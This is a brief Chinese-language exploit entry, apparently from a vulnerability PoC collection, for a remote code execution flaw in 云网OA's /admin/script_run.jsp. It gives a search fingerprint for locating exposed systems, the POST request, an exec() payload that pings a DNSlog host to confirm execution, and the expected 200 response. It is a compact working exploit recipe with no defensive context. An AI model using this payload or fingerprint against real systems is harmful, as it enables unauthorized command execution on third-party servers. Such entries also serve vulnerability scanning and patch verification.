# 云网OAscript_run存在远程代码执行漏洞

云网 ｜ 命令执行 ｜ —
- **指纹**：`body="云网OA"`
- **请求**：`POST /admin/script_run.jsp HTTP/1.1`

**Payload**
```
op=1&myscript=exec("ping ${Dnslog}$");
```
- **响应特征**：200